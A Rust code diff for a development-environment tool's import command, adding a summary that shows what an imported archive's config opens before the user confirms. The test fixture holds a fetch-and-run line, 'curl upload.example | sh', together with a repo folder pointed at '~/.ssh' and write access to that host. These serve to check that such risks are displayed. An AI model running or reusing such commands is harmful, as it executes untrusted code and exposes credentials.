@@ -562,37 +562,90 @@ fn keychain_note(text: &str, env: &str) -> Option<String> {
     Some(note)
 }
 
-/// What the archive is and what importing it as `name` reads on this machine.
-fn describe(path: &Path, head: &Head, name: &str, cfg: &EnvConfig) {
+/// Each credential of `cfg` with the hosts the gate adds it on (`compile`'s injections), or
+/// the hosts its key logs in to. Its git CAs aren't read for it: they are files named by the
+/// config, which nothing looks up before the yes.
+fn credential_hosts(name: &str, cfg: &EnvConfig) -> Result<Vec<(String, String)>> {
+    let mut cfg = cfg.clone();
+    for g in &mut cfg.credentials.git {
+        g.ca = None;
+    }
+    let c = crate::compile::compile(name, &cfg, None, &[])?;
+    Ok(c.bindings
+        .iter()
+        .map(|(binding, spec)| {
+            let mut hosts: Vec<String> = Vec::new();
+            for i in c.policy.injections.iter().filter(|i| &i.binding == binding) {
+                config::extend_unique(&mut hosts, [display(&i.host)]);
+            }
+            let to = match spec {
+                luoto_shared::creds::BindingSpec::SshAgent { .. } => format!(
+                    "logs in to {}",
+                    cfg.credentials
+                        .ssh
+                        .iter()
+                        .flat_map(|s| s.hosts.iter().map(|h| display(h)))
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                ),
+                _ if hosts.is_empty() => "no host".to_string(),
+                _ => hosts.join(", "),
+            };
+            (display(binding), to)
+        })
+        .collect())
+}
+
+/// What the archive is and what importing it as `name` opens on this machine: its folders
+/// as written (nothing here looks them up before the yes), the secrets `up` reads and where
+/// each credential goes, and what of the config reaches past the gate.
+fn summary(path: &Path, head: &Head, name: &str, cfg: &EnvConfig) -> Vec<String> {
     let m = &head.manifest;
-    println!(
+    let mut out = vec![format!(
         "{}: env `{}`, exported by {} {} at {}",
         path.display(),
         display(&m.env),
         display(&m.instance),
         display(&m.luoto),
         display(&m.created)
-    );
+    )];
+    let mut line = |label: &str, value: String| out.push(format!("  {label:<10} {value}"));
     let parts: Vec<&str> = m.parts.iter().map(|p| p.label()).collect();
-    println!("  holds      {}", parts.join(", "));
+    line("holds", parts.join(", "));
     if !m.parts.contains(&Part::Home) {
-        println!(
-            "  home       not in it: `up` makes a new one, and installs agents and toolchains"
+        line(
+            "home",
+            "not in it: `up` makes a new one, and installs agents and toolchains".into(),
         );
     }
     let ws = &cfg.workspace;
     match (&ws.dir, &ws.url) {
-        (Some(d), _) => println!(
-            "  folder     {}{}",
-            display(d),
-            if workspace::canonical(d).is_ok() {
-                ""
-            } else {
-                " (not on this machine)"
-            }
+        (Some(d), _) => line(
+            "folder",
+            format!(
+                "{}: `luoto pull` writes the workspace's files here",
+                display(d)
+            ),
         ),
-        (None, Some(u)) => println!("  remote     {}", display(u)),
+        (None, Some(u)) => line("remote", display(u)),
         _ => {}
+    }
+    for (n, r) in &ws.repos {
+        match (&r.dir, &r.url) {
+            (Some(d), _) => line(
+                "repo",
+                format!(
+                    "{}: {}, where `luoto pull` writes its files",
+                    display(n),
+                    display(d)
+                ),
+            ),
+            (None, Some(u)) => line(
+                "repo",
+                format!("{}: cloned from {}", display(n), display(u)),
+            ),
+            _ => {}
+        }
     }
     let refs = secret_refs(&head.config);
     let az = cfg
@@ -601,20 +654,113 @@ fn describe(path: &Path, head: &Head, name: &str, cfg: &EnvConfig) {
         .as_ref()
         .is_some_and(|a| a.client_secret.is_none());
     if refs.is_empty() && !az {
-        println!("  secrets    none");
+        line("secrets", "none".into());
     } else {
-        println!("  secrets    read on this machine at `up`, from:");
+        line("secrets", "read on this machine at `up`, from:".into());
         for (key, r) in &refs {
-            println!("    {} = {}", display(key), display(r));
+            line("", format!("{} = {}", display(key), display(r)));
         }
         if az {
-            println!("    credentials.azure: your `az` login here");
+            line("", "credentials.azure: your `az` login here".into());
         }
     }
-    println!(
-        "  becomes    env `{name}` of {}, with a CA and vault token of its own",
-        names::instance()
+    match credential_hosts(name, cfg) {
+        Ok(creds) if creds.is_empty() => {}
+        Ok(creds) => {
+            line("sent to", "each credential, by the gate, on:".into());
+            let width = creds.iter().map(|(b, _)| b.len()).max().unwrap_or(0);
+            for (b, to) in creds {
+                line("", format!("{b:<width$}  {to}"));
+            }
+        }
+        Err(e) => line(
+            "sent to",
+            format!(
+                "not listed: the config doesn't compile here ({})",
+                display(&format!("{e:#}"))
+            ),
+        ),
+    }
+    for k in cfg.sandbox_secrets.keys() {
+        line(
+            "in sandbox",
+            format!(
+                "{}: the secret itself, readable by any code in the env",
+                display(k)
+            ),
+        );
+    }
+    for g in &cfg.credentials.git {
+        if g.private {
+            line(
+                "git",
+                format!(
+                    "{}: the gate dials its private addresses (`private = true`)",
+                    display(&g.host)
+                ),
+            );
+        }
+        if let Some(ca) = &g.ca {
+            line(
+                "git",
+                format!(
+                    "{}: trusts the CA in {} (read at `up`)",
+                    display(&g.host),
+                    display(ca)
+                ),
+            );
+        }
+    }
+    match cfg.isolation {
+        Some(config::Isolation::Container) => line(
+            "isolation",
+            "CONTAINER: no gVisor, the VM's kernel is the boundary".into(),
+        ),
+        Some(config::Isolation::Gvisor) => line("isolation", "gVisor".into()),
+        None => {}
+    }
+    if let Some(r) = &cfg.resources.oci_runtime {
+        line(
+            "runtime",
+            format!("{} (runs the dev container)", display(r)),
+        );
+    }
+    if let Some(i) = &cfg.image {
+        line(
+            "image",
+            format!("{} (pulled outside the gate; the env runs it)", display(i)),
+        );
+    }
+    for p in &cfg.ports {
+        line(
+            "ports",
+            format!("{p} (published on 127.0.0.1 on this machine)"),
+        );
+    }
+    for r in &cfg.allow {
+        line("allow", project::rule_line(r));
+    }
+    for c in &cfg.deps.run {
+        line(
+            "run",
+            format!("`{}` (a command the env runs on `up`)", display(c)),
+        );
+    }
+    if head.project.is_some() {
+        line(
+            "luoto.toml",
+            "accepted where it was exported, not here: `up` reviews the workspace's as a new one"
+                .into(),
+        );
+    }
+    line(
+        "becomes",
+        format!(
+            "env `{name}` of {}, with a CA and vault token of its own",
+            names::instance()
+        ),
     );
+    out
 }
 
 /// Clear what an import of `name` cut short left; refuse a name something else holds.
@@ -645,19 +791,28 @@ fn clear_leftovers(ctx: &Ctx, name: &str) -> Result<()> {
     Ok(())
 }
 
-/// The imported env's state and config, once its volumes are written: its own octet, a new
-/// vault token and CA. The config goes last: with it, the env exists.
-fn settle(ctx: &Ctx, name: &str, octet: u8, head: &Head, config: &str) -> Result<()> {
-    let m = &head.state;
-    let s = EnvState {
-        seeded: m.seeded,
-        repos: m.repos.clone(),
+/// The imported env's state on subnet `octet`, with a vault token of its own. Its workspace
+/// and every folder repo count as copied in: their contents came in the archive, and `up`
+/// copies nothing from this machine's folders into an env the archive made.
+fn imported_state(octet: u8, m: &Moved, cfg: &EnvConfig) -> EnvState {
+    let folders = cfg
+        .workspace
+        .repos
+        .iter()
+        .filter(|(_, r)| r.dir.is_some())
+        .map(|(n, _)| n.clone());
+    EnvState {
+        seeded: m.seeded || cfg.workspace.dir.is_some(),
+        repos: m.repos.iter().cloned().chain(folders).collect(),
         ..EnvState::fresh(octet, m.home.clone())
-    };
-    s.save(&ctx.paths, name)?;
-    if let Some(p) = &head.project {
-        write_private(&project::snapshot_path(ctx, name), p.as_bytes())?;
     }
+}
+
+/// The rest of the imported env, once its volumes are written: its answers about repos, a new
+/// CA, then the config, with which the env exists. Not the luoto.toml accepted where it was
+/// exported: `up` reviews the workspace's as a new one.
+fn settle(ctx: &Ctx, name: &str, head: &Head, config: &str) -> Result<()> {
+    let m = &head.state;
     if let Some(d) = &m.declined_project {
         write_private(&project::declined_path(ctx, name), d.as_bytes())?;
     }
@@ -687,10 +842,12 @@ pub fn import(file: &str, name: Option<&str>, yes: bool) -> Result<ExitCode> {
     }
     // In the current format; an older one is upgraded as it is read.
     let cfg = EnvFile::parse(cfg_path.clone(), &head.config).context("its config")?;
-    if let Some(p) = &head.project {
-        project::parse(p).context("its accepted luoto.toml")?;
+    // Its folders are text until the yes: nothing here looks one up.
+    repos::check(&cfg.cfg.workspace).context("its config")?;
+    repos::check_folders_text(&cfg.cfg.workspace).context("its config")?;
+    for line in summary(&path, &head, &name, &cfg.cfg) {
+        println!("{line}");
     }
-    describe(&path, &head, &name, &cfg.cfg);
     if !yes && !confirm(&format!("Import it as `{name}`?")) {
         bail!("nothing imported (`--yes` imports without asking)");
     }
@@ -707,9 +864,16 @@ pub fn import(file: &str, name: Option<&str>, yes: bool) -> Result<ExitCode> {
         );
     }
     env::ensure_image(&ctx, &ctx.image("tools"))?;
-    let octet = state::allocate_octet(&ctx)?;
     let dir = ctx.paths.env_state(&name);
     write_private(&dir.join(PARTIAL), path.display().to_string().as_bytes())?;
+    // The octet is the env's from here: its state holds it while the volumes are written.
+    let octet = match state::reserve(&ctx, &name, |o| imported_state(o, &head.state, &cfg.cfg)) {
+        Ok(s) => s.octet,
+        Err(e) => {
+            let _ = env::remove(&ctx, &name);
+            return Err(e);
+        }
+    };
     let mut sink = Extract {
         ctx: &ctx,
         env: &name,
@@ -721,7 +885,7 @@ pub fn import(file: &str, name: Option<&str>, yes: bool) -> Result<ExitCode> {
         progress.add(n)
     });
     progress.finish();
-    let done = read.and_then(|()| settle(&ctx, &name, octet, &head, &cfg.doc.to_string()));
+    let done = read.and_then(|()| settle(&ctx, &name, &head, &cfg.doc.to_string()));
     if let Err(e) = done {
         // Its input is closed: the container ends, and its volume can go.
         sink.wait();
@@ -917,6 +1081,113 @@ mod tests {
             )
             .is_none()
         );
+    }
+
+    fn head(config: &str, project: Option<&str>, state: Moved) -> Head {
+        Head {
+            manifest: Manifest::new("web", vec![Part::Config, Part::State, Part::Work]),
+            config: config.into(),
+            project: project.map(String::from),
+            state,
+        }
+    }
+
+    const OPENS: &str = r#"
+image = "ghcr.io/acme/img"
+isolation = "container"
+ports = [5173]
+[workspace]
+dir = "/nonexistent/luoto-import/web"
+[workspace.repos.keys]
+dir = "~/.ssh"
+[workspace.repos.lib]
+url = "acme/lib"
+[[allow]]
+host = "upload.example"
+access = "write"
+[deps]
+run = ["curl upload.example | sh"]
+[credentials.custom.api]
+host = "api.example.com"
+secret = "keyring:luoto/api"
+[[credentials.git]]
+host = "forge.internal"
+token = "env:T"
+repos = ["a/b"]
+private = true
+ca = "/nonexistent/luoto-import/ca.pem"
+[sandbox_secrets]
+NPM_TOKEN = "env:NPM_TOKEN"
+"#;
+
+    #[test]
+    fn the_import_summary_shows_what_the_config_opens() {
+        let cfg = EnvFile::parse("web.toml".into(), OPENS).unwrap().cfg;
+        let h = head(OPENS, Some("ports = [1]\n"), Moved::default());
+        let s = summary(Path::new("web.luoto.tar"), &h, "web", &cfg).join("\n");
+        for want in [
+            "/nonexistent/luoto-import/web: `luoto pull` writes the workspace's files here",
+            "keys: ~/.ssh, where `luoto pull` writes its files",
+            "lib: cloned from acme/lib",
+            "custom.api  api.example.com",
+            "git-1",
+            "CONTAINER: no gVisor",
+            "ghcr.io/acme/img (pulled outside the gate",
+            "5173 (published on 127.0.0.1",
+            "upload.example (WRITE)",
+            "`curl upload.example | sh` (a command the env runs",
+            "forge.internal: the gate dials its private addresses",
+            "forge.internal: trusts the CA in /nonexistent/luoto-import/ca.pem",
+            "NPM_TOKEN: the secret itself",
+            "sandbox_secrets.NPM_TOKEN = env:NPM_TOKEN",
+            "`up` reviews the workspace's as a new one",
+        ] {
+            assert!(s.contains(want), "{want}\n{s}");
+        }
+        assert!(
+            s.lines()
+                .any(|l| l.contains("git-1") && l.contains("forge.internal")),
+            "{s}"
+        );
+    }
+
+    #[test]
+    fn the_summary_reads_folders_as_text_alone() {
+        let here = tempfile::tempdir().unwrap();
+        let there = "/nonexistent/luoto-import/web";
+        let summary_of = |dir: &str| {
+            let text = OPENS.replace(there, dir);
+            let cfg = EnvFile::parse("web.toml".into(), &text).unwrap().cfg;
+            let h = head(&text, None, Moved::default());
+            summary(Path::new("x"), &h, "web", &cfg)
+                .join("\n")
+                .replace(dir, "<dir>")
+        };
+        assert_eq!(
+            summary_of(&here.path().display().to_string()),
+            summary_of(there)
+        );
+    }
+
+    #[test]
+    fn an_import_copies_nothing_in_from_this_machine() {
+        let cfg = EnvFile::parse("web.toml".into(), OPENS).unwrap().cfg;
+        let moved = Moved {
+            seeded: false,
+            repos: ["gone".to_string()].into(),
+            ..Default::default()
+        };
+        let s = imported_state(9, &moved, &cfg);
+        assert_eq!(s.octet, 9);
+        assert!(s.seeded, "the workspace came in the archive");
+        assert!(s.repos.contains("keys"), "a folder repo came in it too");
+        assert!(!s.repos.contains("lib"), "a remote not in it is cloned");
+        assert!(!s.installs_pending);
+        // A remote whose clone never finished is cloned at `up`, through the gate.
+        let cloned = EnvFile::parse("web.toml".into(), "[workspace]\nurl = \"acme/web\"\n")
+            .unwrap()
+            .cfg;
+        assert!(!imported_state(9, &Moved::default(), &cloned).seeded);
     }
 
     #[test]
